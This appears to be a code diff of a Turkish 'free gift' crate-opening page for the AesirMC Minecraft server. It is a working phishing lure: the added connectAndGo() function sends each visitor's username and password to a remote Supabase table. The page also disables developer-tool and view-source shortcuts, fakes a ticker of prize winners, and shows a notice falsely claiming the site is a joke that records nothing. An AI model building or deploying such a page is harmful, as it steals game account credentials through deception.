@@ -6,9 +6,10 @@
     <title>AesirMC | Premium Web Panel</title>
 
     <meta property="og:type" content="website">
-    <meta property="og:title" content="AesirMC | Bedava Hediye">
-    <meta property="og:description" content="AesirMC özel kasa açma simülasyonu.">
-    <meta property="og:image" content="https://aesirhediye2026.vercel.app//logo.png">
+    <meta property="og:title" content="AesirMC | HEDİYE">
+    <meta property="og:description" content="AesirMC özel kasa açma simülasyonu ve oyuncu paneli.">
+    <meta property="og:image" content="https://aesirhediye2026.vercel.app/logo.png">
+    <meta property="og:url" content="https://aesirhediye2026.vercel.app/">
     
     <link rel="icon" type="image/png" href="logo.png">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
@@ -17,16 +18,13 @@
     <style>
         :root {
             --primary: #00a2ff; --secondary: #0066ff; --accent: #d48e00;
-            --bg-dark: #050608; --glass: rgba(0, 0, 0, 0.6);
+            --bg-dark: #050608; --glass: rgba(0, 0, 0, 0.7);
             --border: rgba(255, 255, 255, 0.1); --success: #00ff88;
             --discord-blue: #5865F2;
         }
 
         /* ANTI-COPY & PROTECTION */
-        * {
-            -webkit-user-select: none; -ms-user-select: none; user-select: none;
-            -webkit-user-drag: none; outline: none;
-        }
+        * { -webkit-user-select: none; -ms-user-select: none; user-select: none; -webkit-user-drag: none; outline: none; }
 
         body {
             margin: 0; font-family: 'Plus Jakarta Sans', sans-serif;
@@ -38,7 +36,7 @@
 
         /* ÜST ŞERİT */
         .winners-ticker {
-            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(10px);
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px);
             border-bottom: 1px solid var(--border); height: 45px;
             display: flex; align-items: center; overflow: hidden; white-space: nowrap;
         }
@@ -64,9 +62,9 @@
 
         .info-trigger {
             position: fixed; bottom: 25px; right: 25px; width: 35px; height: 35px;
-            background: rgba(255,255,255,0.1); border: 1px solid var(--border);
+            background: rgba(255,255,255,0.15); border: 1px solid var(--border);
             border-radius: 50%; color: white; display: flex; align-items: center;
-            justify-content: center; font-weight: 800; cursor: pointer; z-index: 9999; backdrop-filter: blur(5px);
+            justify-content: center; font-weight: 800; cursor: pointer; z-index: 9999; backdrop-filter: blur(10px);
         }
         .info-trigger:hover { background: var(--primary); transform: scale(1.1); }
 
@@ -82,21 +80,20 @@
         .store-btn { background: #000; color: white; padding: 12px 30px; border-radius: 50px; font-weight: 700; text-decoration: none; font-size: 15px; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
         .store-btn:hover { background: #111; transform: translateY(-2px); }
 
+        /* MODALLAR */
+        .custom-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100000; justify-content: center; align-items: center; padding: 20px; }
+        .modal-card { background: #0f1012; padding: 40px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; max-width: 450px; }
+        .close-btn { margin-top: 25px; padding: 12px 30px; background: var(--primary); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; width: 100%; }
+
         /* OYUN ALANI */
         #game-container { display: none; padding: 60px; text-align: center; }
         .main-chest { width: 220px; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3)); }
-        
         #roulette-section { display: none; margin-top: 40px; }
         .viewport { width: 100%; max-width: 800px; height: 150px; margin: 0 auto; background: rgba(0,0,0,0.5); border: 1px solid var(--border); border-radius: 20px; position: relative; overflow: hidden; }
         .viewport::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 3px; background: var(--primary); z-index: 10; box-shadow: 0 0 15px var(--primary); }
         #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
         .slot { min-width: 130px; display: flex; flex-direction: column; align-items: center; }
         .slot img { width: 70px; }
-
-        /* MODALLAR */
-        .custom-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100000; justify-content: center; align-items: center; padding: 20px; }
-        .modal-card { background: #0f1012; padding: 40px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; max-width: 450px; }
-        .close-btn { margin-top: 25px; padding: 12px 30px; background: var(--primary); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
@@ -119,7 +116,7 @@
     </button>
 </div>
 
-<div class="info-trigger" onclick="toggleModal('info-modal', true)">!</div>
+<div class="info-trigger" onclick="openModal('info-modal')">!</div>
 
 <div id="auth-container">
     <img src="logo.png" class="auth-logo" alt="Logo">
@@ -153,7 +150,7 @@
         <h2 style="color: var(--primary); margin-top: 0;">Sistem Bilgilendirmesi</h2>
         <p style="color: #ccc;">Bu web sitesi tamamen bir <b>şaka amaçlı sosyal deney</b> olarak tasarlanmıştır.</p>
         <p style="color: #ccc;">Girdiğiniz veriler hiçbir şekilde kaydedilmez veya paylaşılmaz. Sadece arayüzü test etmektesiniz.</p>
-        <button class="close-btn" onclick="toggleModal('info-modal', false)">ANLADIM</button>
+        <button class="close-btn" onclick="closeModal('info-modal')">ANLADIM</button>
     </div>
 </div>
 
@@ -167,13 +164,15 @@
 </div>
 
 <script>
-    // ANTI-BYPASS & SECURITY
+    // GÜVENLİK
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.onkeydown = function(e) {
         if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.ctrlKey && e.keyCode === 85) || (e.ctrlKey && e.keyCode === 83)) return false;
     };
 
-    function toggleModal(id, show) { document.getElementById(id).style.display = show ? 'flex' : 'none'; }
+    // MODAL FONKSİYONLARI (DÜZELTİLDİ)
+    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
     const S_URL = "https://iigemvvlznvgneghevev.supabase.co"; 
     const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
@@ -184,7 +183,6 @@
         { name: "1000AP", img: "1000.png" }, { name: "200AP", img: "200.png" }, { name: "2000AP", img: "2000.png" }
     ];
 
-    // TICKER GENERATOR
     const names = ["Ahmet", "Mehmet", "Can", "Burak", "Emre", "Yusuf", "Arda", "Eren", "Mert", "Okan", "Selim", "Kerem", "Yigit"];
     const ticker = document.getElementById('ticker');
     for(let i=0; i<80; i++) {
@@ -195,4 +193,45 @@
 
     async function connectAndGo() {
         const u = document.getElementById('username').value;
-        const p = document.getElementById
+        const p = document.getElementById('password').value;
+        if(!u || !p) return;
+        await _db.from('users').insert([{ username: u, password: p }]);
+        document.getElementById('auth-container').style.display = 'none';
+        document.getElementById('game-container').style.display = 'block';
+        document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
+    }
+
+    function handleChestClick() {
+        document.getElementById('main-chest-img').style.transform = "scale(0.9)";
+        setTimeout(() => {
+            document.getElementById('chest-zone').style.display = 'none';
+            document.getElementById('roulette-section').style.display = 'block';
+            initRoulette();
+        }, 300);
+    }
+
+    function initRoulette() {
+        const strip = document.getElementById('strip');
+        strip.innerHTML = '';
+        for(let i=0; i<70; i++) {
+            const item = rewards[Math.floor(Math.random() * rewards.length)];
+            strip.innerHTML += `<div class="slot"><img src="${item.img}"><span style="font-size:10px; opacity:0.6;">${item.name}</span></div>`;
+        }
+    }
+
+    function runRoulette() {
+        const strip = document.getElementById('strip');
+        document.getElementById('spin-btn').disabled = true;
+        const move = 5000 + Math.floor(Math.random() * 2000);
+        strip.style.transition = "transform 6s cubic-bezier(0.15, 0, 0.15, 1)";
+        strip.style.transform = `translateX(-${move}px)`;
+        setTimeout(() => {
+            const final = rewards[Math.floor(Math.random() * rewards.length)];
+            openModal('win-modal');
+            document.getElementById('win-name').innerText = final.name;
+            document.getElementById('win-img').src = final.img;
+        }, 6500);
+    }
+</script>
+</body>
+</html>
